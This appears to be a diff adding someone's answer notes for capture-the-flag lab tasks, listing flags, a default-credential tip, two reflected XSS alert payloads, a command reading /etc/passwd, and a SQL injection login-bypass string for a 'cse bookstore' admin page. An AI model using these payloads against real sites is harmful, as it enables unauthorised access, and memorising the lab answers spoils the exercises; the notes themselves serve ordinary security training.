@@ -1,0 +1,35 @@
+task 19:
+
+Hack into the webapp, and find the flag!
+thm{4b9513968fd564a87b28aa1f9d672e17}
+
+solution:
+look up pensive notes on github. documentation included
+default username and password
+
+task 20:
+
+
+Navigate to http://10.10.80.91/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
+
+ThereIsMoreToXSSThanYouThink
+
+solution:
+<script>alert(“Hello”)</script>
+
+On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
+
+ReflectiveXss4TheWin
+
+solution
+
+<script>alert(window.location.hostname)</script>
+
+task 29:
+
+How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
+
+cse bookstore
+admin login:
+username:admin
+pass:  %' or '1'='1 
